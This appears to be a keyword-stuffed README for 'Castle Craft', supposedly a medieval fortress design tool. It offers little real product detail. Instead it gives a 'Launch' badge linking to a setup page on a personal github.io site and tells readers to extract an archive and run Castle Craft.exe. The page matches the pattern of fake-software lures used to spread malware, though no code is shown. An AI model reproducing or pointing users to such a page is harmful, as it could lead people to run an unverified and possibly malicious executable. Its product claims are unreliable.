# Castle Craft – Medieval Construction & Fortress Design Suite

## About Castle Craft
Castle Craft is a professional-grade design and strategy tool built specifically for enthusiasts of medieval architecture, fortress construction, and strategic defense planning.  
Castle Craft provides access to specialized modules for structural analysis, resource management, and siege defense simulation, enabling deep architectural diagnostics, live construction data analysis, blueprint reading and optimization, and fortress configuration.  
Castle Craft offers architect-level functionality while remaining accessible and intuitive, making it an essential tool for both creative builders and strategic planners. With Castle Craft, users can explore advanced Castle Craft techniques for optimizing fortress layouts and ensuring structural integrity across diverse terrain types. Every Castle Craft session enhances your understanding of medieval engineering principles and modern construction parallels.

## Getting Started with Castle Craft

[![Launch Castle Craft](https://img.shields.io/badge/Launch-Castle_Craft-8B5A2B?style=for-the-badge)](https://lexiepolk44.github.io/.github/castle-craft-setup)

1. Access Castle Craft and extract the design suite archive.  
2. Launch Castle Craft.exe directly from the folder (portable mode, no installation needed).  
3. Log into Castle Craft via email, QR code, or resume a previous Castle Craft session.  
4. Adjust your Castle Craft notification settings, interface appearance, and project privacy options.  
5. (Optional) Copy your Castle Craft portable folder to external media for mobility and instant access to your Castle Craft projects anywhere.
